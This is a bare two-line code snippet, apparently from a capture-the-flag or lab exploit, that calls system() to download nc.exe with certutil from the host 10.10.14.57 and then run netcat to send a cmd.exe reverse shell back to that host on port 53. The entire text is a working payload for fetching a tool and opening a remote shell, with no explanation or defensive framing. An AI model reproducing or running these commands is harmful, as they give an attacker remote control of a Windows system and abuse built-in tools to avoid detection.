system("certutil -urlcache -split -f http://10.10.14.57/nc.exe nc.exe");
system("nc.exe 10.10.14.57 53 -e cmd.exe");
